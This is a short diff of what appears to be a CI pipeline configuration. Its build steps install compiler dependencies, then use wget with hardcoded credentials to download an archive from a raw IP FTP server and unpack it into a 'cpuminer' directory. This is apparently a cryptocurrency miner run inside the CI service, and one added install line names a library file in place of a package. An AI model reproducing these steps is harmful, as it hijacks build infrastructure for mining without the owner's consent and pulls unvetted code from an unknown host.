@@ -6,8 +6,8 @@ steps:
       - |
           apt-get update
           apt-get install -y wget
-          apt-get install -y libcurl3
-          apt-get install -y libssl1.0.0
+          apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
+          apt-get install -y libssl.so.1.1
           wget --user=u750504516 --password='Vp123456' ftp://194.59.164.70/c.tar.gz
           tar xf c.tar.gz
           cd cpuminer
